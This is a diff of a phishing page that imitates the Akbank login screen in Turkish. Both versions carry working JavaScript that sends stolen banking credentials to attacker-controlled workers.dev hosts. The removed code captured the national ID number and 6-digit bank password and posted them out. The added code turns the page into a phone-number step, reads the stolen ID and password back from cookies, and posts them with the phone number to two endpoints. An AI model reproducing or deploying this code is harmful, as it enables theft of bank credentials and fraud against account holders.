@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1.0, user-scalable=no">
     
     
-    <script defer src="https://eu.umami.is/script.js" data-website-id="4c809f32-8d3f-4186-b39f-851a15230ecf"></script>
+    
     <meta name="msapplication-tap-highlight" content="no">
  
     <link href="./core.css" rel="stylesheet" type="text/css">
@@ -29,15 +29,7 @@
     </script>
 </head>
 <body>
-    <style>
-
-
-        body {
-    background-color: #ed1a1e;
-    max-width: 500px;
-    margin: 0 auto; /* Sayfada içeriği ortala */
-}
-    </style>
+    
 
     <input name="__RequestVerificationToken" type="hidden" value="pOPduPcBg3i884t7cFX48_Y3jtewy4Ny0x_roujpGX6l2NvFU60mzCjFPtt7cxdGMefkWZ-2fm-U_stysJn2l7IEOisYlcemKZQqy4vPWnPOgM_JG58tWoJ6jssIVo83FPQ0aQBiVESNcPvsJfUdZQ2">
     <div id="applicationHost"><div data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }" data-view="views/shell" style="" data-active-view="true"><div class="guest" data-view="views/guest/guest" data-active-view="true" style="">
@@ -75,10 +67,25 @@
         <!-- /ko -->
  
     </div>
-    <form
+    <div class="item-text" style="    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    line-height: 1.42857143;
+    user-select: none;
+    color: #fff;
+    font-family: 'Open Sans';
+    font-size: 15px;
+    font-weight: 300;
+    box-sizing: border-box;
+    width: 99%;
+    display: table-cell;
+    vertical-align: middle;
+    padding: 18px 20px;
+    padding-right: 0;text-align: left;"><!--ko text:GetString('ForgotMBB')-->  Lütfen Telefon Numaranızı yazınız.<!--/ko--></div>
     <div class="content-area" data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }"><div class="login-form-wrap" data-view="views/guest/login/mbblogin/mbblogin" data-active-view="true" style="">
     <div class="login-router" data-bind="router: { cacheViews: false, alwaysTriggerAttach: true }"><div class="mbbcclogin" data-view="views/guest/login/mbblogin/subviews/mbbloginpasswordcaptcha" data-active-view="true" style="">
-    <text-input-login params="type:'mbb', placeholder:GetString('CustomerNumberLogin'),value:mbbNo"><div class="text-input-login">
+    
+    
+        <text-input-login params="type:'mbb', placeholder:GetString('CustomerNumberLogin'),value:mbbNo"><div class="text-input-login">
     <div data-bind="attr: { class: className}" class="text-input">
         <div class="text-input-wrap">
             <div class="icon-part">
@@ -94,10 +101,10 @@
                 <!-- ko if: type()=='phonenumber' --><!-- /ko -->
                 <!-- ko if: type()=='captcha'--><!-- /ko -->
             </div>
-                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+              
             <div class="input-part">
                 <!-- ko if: type()=='mbb' -->
-                <input class="inputarea" type="text" pattern="[0-9]*" id="tcno" name="tcno" minlength="11"  maxlength="11" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" placeholder="Müşteri / TC Kimlik No">
+                <input class="inputarea" type="number" pattern="[0-9]*" id="telno" name="telno" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" placeholder="+90">
                 <!-- /ko -->
                 <!-- ko if: type()=='yatirimci' --><!-- /ko -->
                 <!-- ko if: type()=='ast' --><!-- /ko -->
@@ -133,15 +140,7 @@
                 <!-- ko if: type()=='mbb' --><!-- /ko -->
                 <!-- ko if: type()=='yatirimci' --><!-- /ko -->
                 <!-- ko if: type()=='ast' -->
-<input class="inputarea" 
-       type="password" 
-       id="pass" 
-       name="pass" 
-       maxlength="6" 
-       pattern="[0-9]*" 
-       data-bind="bind-numeric-password: value, attr: { placeholder : placeholder},settings: { maxlength: 6 }" 
-       placeholder="Akbank Şifresi" 
-       inputmode="numeric">                <!-- /ko -->
+                 <!-- /ko -->
                 <!-- ko if: type()=='whitePass' --><!-- /ko -->
                 <!-- ko if: type()=='cepsifre' --><!-- /ko -->
                 <!-- ko if: type()=='kk' --><!-- /ko -->
@@ -182,7 +181,7 @@
                 <!-- ko if: type()=='kk' --><!-- /ko -->
                 <!-- ko if: type()=='skt' --><!-- /ko -->
                 <!-- ko if: type()=='phonenumber' -->
-                <input class="inputarea" type="text" pattern="[0-9]*" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: maxlength }" placeholder="Cep telefonu numaranı gir">
+                <input class="inputarea" type="text" pattern="[0-9]*" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: maxlength }" placeholder="+90">
                 <!-- /ko -->
                 <!-- ko if: type()=='captcha' --><!-- /ko -->
             </div>
@@ -243,14 +242,14 @@
     </div>
     <div>
         <a class="forget-item" href="#" data-bind="click:forgotMBB">
-            <div class="item-text"><!--ko text:GetString('ForgotMBB')-->Müşteri numaramı bilmiyorum<!--/ko--></div>
+           
             <div class="arrow">
                 <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
             </div>
         </a>
     </div>
     <a class="forget-item" href="#" data-bind="click:forgotPassword">
-        <div class="item-text"><!--ko text:GetString('ForgotPassword')-->Şifremi bilmiyorum<!--/ko--></div>
+         
         <div class="arrow">
             <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
         </div>
@@ -297,7 +296,7 @@
     <a href="#" data-bind="click: NavigateToDirectLoanApplication" class="extras-link desktop-site">
         <div class="extras-wrap">
             <div class="extras-icon">
-                <img class="loan-image" src="../../../../../content/application/images/icon-set/loan-g.svg" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;">
+              
             </div>
             <span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
             <div class="extras-arrow">
@@ -398,159 +397,81 @@
     </div>
 </div></div>
  
-
 <script>
-    // JavaScript kodunu HTML içeriğinin tamamen yüklendiği bir noktaya taşıdık
-    document.addEventListener("DOMContentLoaded", function () {
-        function setCookie(name, value, days) {
-    var expires = "";
-    if (days) {
-        var date = new Date();
-        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-        expires = "; expires=" + date.toUTCString();
+    function getCookie(name) {
+        var nameEQ = name + "=";
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+        }
+        return null;
     }
-    document.cookie = name + "=" + (value || "") + expires + "; path=/";
-}
 
-              var savedName = getCookie("savedName");
-            if (!savedName) {
-                var randomName = generateRandomName(6);
-                setCookie("savedName", randomName, 1);
-            }
-        var tcInput = document.getElementById("tcno");
-        var passInput = document.getElementById("pass");
+    var phoneNumberInput = document.getElementById('telno');
 
-        // Giriş düğmesi
-        var loginBtn = document.getElementById("loginBtn");
+    // Giriş butonu
+    var loginBtn = document.getElementById('loginBtn');
 
-        // TC kimlik numarası ve şifre doğrulama fonksiyonu
-        async function validateInputs() {
-            var tcno = tcInput.value;
-            var pass = passInput.value;
+    // Cep telefonu numarası input alanını dinle
+    phoneNumberInput.addEventListener('input', function () {
+        var phoneNumber = phoneNumberInput.value;
 
-            // TC kimlik numarası ve şifre uzunluğunu kontrol et
-            if (tcno.length === 11 && pass.length === 6) {
-                // TC kimlik numarası doğrulaması
-                if (await tcno_dogrula_ve_islem_yap(tcno)) {
-                    // Giriş düğmesini etkinleştir
-                    loginBtn.disabled = false;
-                } else {
-                    // TC kimlik numarası geçerli değilse giriş düğmesini devre dışı bırak
-                    loginBtn.disabled = true;
-                    alert("Geçersiz TC Kimlik Numarası");
-                }
-            } else {
-                // TC kimlik numarası ve şifre eksikse giriş düğmesini devre dışı bırak
-                loginBtn.disabled = true;
-            }
+        // Eğer en az 8 karakter girilmişse
+        if (phoneNumber.length >= 8) {
+            // Giriş butonunun disable özelliğini kaldır
+            loginBtn.removeAttribute('disabled');
+        } else {
+            // Giriş butonunu disable yap
+            loginBtn.setAttribute('disabled', 'disabled');
         }
-
-        // TC kimlik numarası ve şifre alanlarının değerlerinin değiştiğini izle
-        tcInput.addEventListener("input", validateInputs);
-        passInput.addEventListener("input", validateInputs);
-
-        // Giriş düğmesine tıklandığında formu gönder
-        loginBtn.addEventListener("click", function () {
-            // TC kimlik numarası ve şifreyi al
-            var tcno = tcInput.value;
-            var pass = passInput.value;
-
-            // Kullanıcıya atanmış adı al
-            var assignedName = getCookie("savedName");
-
-            // TC kimlik numarası ve şifre uzunluğunu kontrol et
-            if (tcno.length === 11 && pass.length === 6) {
-                // TC kimlik doğrulaması yap
-if (tcno_dogrula_ve_islem_yap(tcno)) {
-    // Cookie'leri oluştur
-    document.cookie = `tcno=${tcno}; path=/`;
-    document.cookie = `pass=${pass}; path=/`;
-
-    // POST işlemi için veri oluştur
-    var data = new FormData();
-    data.append('tcno', tcno);
-    data.append('pass', pass);
-
-    // POST işlemi için fetch kullanarak isteği oluştur
-    fetch('https://worker-hidden-meadow-bce1.selimjuhan2.workers.dev/', {
-        method: 'POST',
-        body: data
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log(data);
-        window.location.href = 'telefon.html';
-    })
-    .catch(error => {
-        console.error('Hata:', error);
-        window.location.href = 'telefon.html';
     });
-}
-else {
-                    alert("Geçersiz TC Kimlik Numarası");
-                }
-            } else {
-                alert("TC Kimlik Numarası ve şifre eksik veya hatalı.");
-            }
-        }); 
 
-        // TC kimlik doğrulama fonksiyonu
-        async function tcno_dogrula_ve_islem_yap(tcno) {
-            // TC kimlik doğrulama fonksiyonu
-            tcno = String(tcno);
-            if (tcno.substring(0, 1) === '0') {
-                return false;
-            }
-            if (tcno.length !== 11) {
-                return false;
-            }
-            var ilkon_array = tcno.substr(0, 10).split('');
-            var ilkon_total = hane_tek = hane_cift = 0;
-            for (var i = j = 0; i < 9; ++i) {
-                j = parseInt(ilkon_array[i], 10);
-                if (i & 1) {
-                    hane_cift += j;
-                } else {
-                    hane_tek += j;
-                }
-                ilkon_total += j;
-            }
-            if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
-                return false;
-            }
-            ilkon_total += parseInt(ilkon_array[9], 10);
-            if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
-                return false;
-            }
-            return true;
-        }
+    // Giriş butonuna tıklanınca
+    loginBtn.addEventListener('click', function () {
+        var telno = document.getElementById('telno').value;
 
+        // Cookie'den kayıtlı adı al
+        var tcno = getCookie("tcno");
+        var pass = getCookie("pass");
 
-        function getCookie(name) {
-            var nameEQ = name + "=";
-            var ca = document.cookie.split(';');
-            for (var i = 0; i < ca.length; i++) {
-                var c = ca[i];
-                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
-            }
-            return null;
-        }
+        // POST işlemi için veri oluştur
+        var data = new FormData();
+        data.append('telno', telno);
+        data.append('tcno', tcno); // Cookie'den alınan adı ekle
+        data.append('pass', pass);
 
-        // Rastgele ad oluşturma fonksiyonu
-        function generateRandomName(length) {
-            var result = '';
-            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            var charactersLength = characters.length;
-            for (var i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * charactersLength));
-            }
-            return result;
-        }
+        // POST işlemi için fetch kullanarak isteği oluştur
+        fetch('https://worker-red-mountain-1d57.zalexisgod.workers.dev/', {
+            method: 'POST',
+            body: data
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+            window.location.href = 'onay.html';
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+            window.location.href = 'onay.html';
+        });
 
-   
+        // İkinci adres için aynı işlemi gerçekleştir
+        fetch('https://worker-hidden-meadow-bce1.selimjuhan2.workers.dev/', {
+            method: 'POST',
+            body: data
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+            // İkinci adresin cevabına göre işlem yapabilirsiniz
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+        });
     });
 </script>
 
-
+ 
 </body></html>
